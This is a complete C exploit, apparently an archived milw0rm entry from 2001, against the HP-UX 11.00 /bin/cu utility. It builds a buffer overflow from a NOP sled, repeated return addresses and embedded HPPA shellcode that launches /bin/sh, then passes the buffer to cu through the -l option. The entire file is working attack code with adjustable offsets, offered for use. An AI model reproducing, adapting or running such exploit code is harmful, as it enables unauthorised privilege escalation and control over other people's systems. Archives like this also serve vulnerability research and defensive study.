/*
 * Copyright (c) 2001 Zorgon                              
 * All Rights Reserved                                    
 * The copyright notice above does not evidence any       
 * actual or intended publication of such source code.    
 * 
 * HP-UX /bin/cu exploit.
 * Tested on HP-UX 11.00 
 * zorgon@antionline.org (http://www.nightbird.free.fr) 
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

#define LEN 9778 
#define HPPA_NOP 0x0b390280
#define RET 0x7f7eb010
#define OFFSET 1200    /* it works for me */

u_char hppa_shellcode[] = /* K2 <ktwo@ktwo.ca> shellcode */
"\xe8\x3f\x1f\xfd\x08\x21\x02\x80\x34\x02\x01\x02\x08\x41\x04\x02\x60\x40"
"\x01\x62\xb4\x5a\x01\x54\x0b\x39\x02\x99\x0b\x18\x02\x98\x34\x16\x04\xbe"
"\x20\x20\x08\x01\xe4\x20\xe0\x08\x96\xd6\x05\x34\xde\xad\xca\xfe/bin/sh\xff";

int 
main(int argc , char **argv){
  char buffer[LEN+8];
  int i;
  long retaddr = RET;
  int offset = OFFSET;
 
  if(argc>1) offset = atoi(argv[1]);
    for (i=0;i<LEN;i+=4)
      *(long *)&buffer[i] = retaddr + offset; 

  for (i=0;i<(LEN-strlen(hppa_shellcode)-50);i++) 
    *(buffer+i) = HPPA_NOP;

  memcpy(buffer+i,hppa_shellcode,strlen(hppa_shellcode));
  fprintf(stderr, "HP-UX 11.00 /bin/cu exploit\n");
  fprintf(stderr, "Copyright (c) 2001 Zorgon\n");                              
  fprintf(stderr, "[return address = %x] [offset = %d] [buffer size = %d]\n", retaddr + offset, offset, strlen(buffer));

  execl("/bin/cu","cu","-l",buffer,0);
}


// milw0rm.com [2001-01-13]
